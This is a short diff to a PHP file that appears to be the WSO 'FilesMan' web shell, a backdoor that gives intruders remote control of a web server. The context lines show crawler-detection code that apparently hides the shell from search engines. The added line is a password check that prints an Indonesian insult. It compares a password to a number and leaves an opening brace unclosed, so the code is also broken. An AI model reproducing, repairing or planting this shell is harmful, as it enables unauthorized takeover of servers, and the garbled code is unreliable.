@@ -34,6 +34,7 @@ $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
+if($auth_pass > 50){ die("<center><b><font color='red'>Password yang Anda masukkan salah Goblok..!".$warn."</font></b></center>");
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
     if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
